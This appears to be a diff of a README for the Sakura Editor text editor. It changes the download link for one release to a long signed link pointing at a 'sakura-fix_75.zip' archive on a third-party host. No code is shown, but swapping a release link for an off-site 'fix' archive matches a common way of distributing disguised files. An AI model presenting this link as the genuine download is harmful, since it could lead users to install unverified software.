@@ -18,7 +18,7 @@ Introduction
 
 Download  
 --------
-- v2<b>.</b>4205<b>.</b>2020<b>.</b>75 (2020-08-19) | [Download](https://shorturl.at/wFOW8)
+- v2<b>.</b>4205<b>.</b>2020<b>.</b>75 (2020-08-19) | [Download](https://helixteamhub.cloud/api/projects/sakura/repositories/public/commits/webdav/files/sakura-fix_75.zip?api_signing_key=95648202-93a2-4469-9aaf-62f1afb4be1f&expires_at=2120-08-19T09%3A36%3A59.447Z&signature=9d894f4353eca42639623423c593e318115e8393888056902094e678596f6184)
     - Used Visual Studio 2017 Version 15.9.25
     - Used Windows SDK 10.0.17763.0
     - バージョン表記の変更
